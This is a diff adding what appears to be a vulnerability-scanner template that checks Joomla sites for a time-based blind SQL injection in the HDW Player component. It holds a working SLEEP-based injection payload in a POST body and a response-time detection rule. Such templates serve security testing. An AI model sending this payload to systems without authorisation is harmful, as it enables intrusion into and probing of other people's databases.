@@ -1,0 +1,25 @@
+id: joomla-sqli-hdwplayer-01
+info:
+  name: Joomla SQL Injection 01
+  risk: High
+
+params:
+  - root: "{{.BaseURL}}/index.php"
+  - sleep: '8'
+
+requests:
+  - method: POST
+    redirect: false
+    url: >-
+      {{.root}}
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+      - Content-Type: application/x-www-form-urlencoded; charset=utf-8
+    body: |
+      option=com_hdwplayer&view=search&hdwplayersearch=')+AND+(SELECT+6495+FROM+(SELECT(SLEEP({{.sleep}})))IAul)--+vYqM
+    detections:
+      - >-
+        StatusCode() == 200 && ResponseTime() > {{.sleep}}
+
+reference:
+  - link: https://www.exploit-db.com/exploits/48242
